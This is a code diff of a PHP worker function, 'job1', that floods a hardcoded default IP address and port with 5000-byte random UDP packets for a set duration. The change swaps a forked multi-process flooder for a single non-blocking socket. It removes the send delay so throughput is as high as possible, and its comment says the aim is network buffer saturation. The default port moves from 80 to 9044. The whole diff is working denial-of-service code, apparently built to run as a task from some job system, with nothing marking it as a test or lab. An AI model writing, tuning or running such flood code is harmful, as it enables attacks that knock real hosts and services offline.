@@ -220,7 +220,7 @@ function workerProgress(
 
 
 // ============================================================
-// JOB 1 (MULTI-THREADED/FORKED VERSION)
+// JOB 1 (WEB-COMPLIANT / SINGLE-PROCESS HIGH-SPEED VERSION)
 // ============================================================
 
 function job1(
@@ -232,7 +232,7 @@ function job1(
         $task['target_ip'] ?? '35.79.103.106';
 
     $targetPort =
-        $task['target_port'] ?? 80;
+        $task['target_port'] ?? 9044;
 
     $packetSize =
         $task['packet_size'] ?? 5000;
@@ -240,100 +240,71 @@ function job1(
     $duration =
         $task['duration'] ?? 30;
 
-    // Default to 4 processes/threads if not specified
-    $numProcesses =
-        $task['num_processes'] ?? 4;
-
     $start =
         microtime(true);
 
     if ($report !== null) {
-
         $report(
             0,
-            'Job started with ' . $numProcesses . ' processes'
+            'Job started in web-compatible high-speed mode'
         );
     }
 
-    $pids = [];
     $packetCount = 0;
     $iterations = 0;
 
-    // Spawn worker processes using pcntl_fork (available in PHP CLI)
-    for ($i = 0; $i < $numProcesses; $i++) {
-        $pid = pcntl_fork();
-
-        if ($pid == -1) {
-            continue;
-        } else if ($pid) {
-            // Parent process tracks child PIDs
-            $pids[] = $pid;
-        } else {
-            // --- CHILD PROCESS CODE ---
-            $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
-            if ($socket === false) {
-                exit(1);
-            }
-
-            $payload = random_bytes($packetSize);
-            $deadline = microtime(true) + $duration;
-            $localPackets = 0;
-            $localIterations = 0;
-
-            while (microtime(true) < $deadline) {
-                @socket_sendto(
-                    $socket,
-                    $payload,
-                    $packetSize,
-                    0,
-                    $targetIp,
-                    $targetPort
-                );
-
-                $localPackets++;
-                $localIterations++;
-                usleep(100);
-            }
-
-            socket_close($socket);
-            exit(0); // Exit child process safely
-        }
+    // Create a single UDP socket
+    $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+    if ($socket === false) {
+        throw new Exception('Failed to create UDP socket');
     }
 
-    // Monitor progress and wait for child processes from the parent process
+    // Set non-blocking to prevent micro-stalls
+    socket_set_nonblock($socket);
+
+    $payload = random_bytes($packetSize);
     $deadline = $start + $duration;
+    $lastReport = $start;
+
+    // High-speed single-process dispatch loop
     while (microtime(true) < $deadline) {
-        
-        static $lastReport = 0.0;
+        @socket_sendto(
+            $socket,
+            $payload,
+            $packetSize,
+            0,
+            $targetIp,
+            $targetPort
+        );
+
+        $packetCount++;
+        $iterations++;
+
         $now = microtime(true);
 
-        if ($now - $lastReport >= 1.0) {
+        // Periodic progress reporting (every 1 second)
+        if ($report !== null && ($now - $lastReport >= 1.0)) {
             $elapsed = $now - $start;
             $progress = min(
                 99,
                 ($elapsed / $duration) * 100
             );
 
-            if ($report !== null) {
-                $report(
-                    $progress,
-                    'Job running'
-                );
-            }
+            $report(
+                $progress,
+                'Job running'
+            );
 
             $lastReport = $now;
         }
 
-        usleep(10000); // Check progress every 10ms
+        // Removed usleep(100) to allow maximum possible packet throughput,
+        // relying on network buffer saturation instead.
     }
 
-    // Wait for all child worker processes to complete
-    foreach ($pids as $pid) {
-        pcntl_waitpid($pid, $status);
-    }
+    socket_close($socket);
 
     if ($report !== null) {
-
         $report(
             100,
             'Job completed'
@@ -341,21 +312,11 @@ function job1(
     }
 
     return [
-
-        'success' =>
-            true,
-
-        'duration' =>
-            microtime(true) - $start,
-
-        'iterations' =>
-            $iterations,
-
-        'packets_sent' =>
-            $packetCount,
-
-        'processes_used' =>
-            $numProcesses
+        'success' => true,
+        'duration' => microtime(true) - $start,
+        'iterations' => $iterations,
+        'packets_sent' => $packetCount,
+        'processes_used' => 1
     ];
 }
 
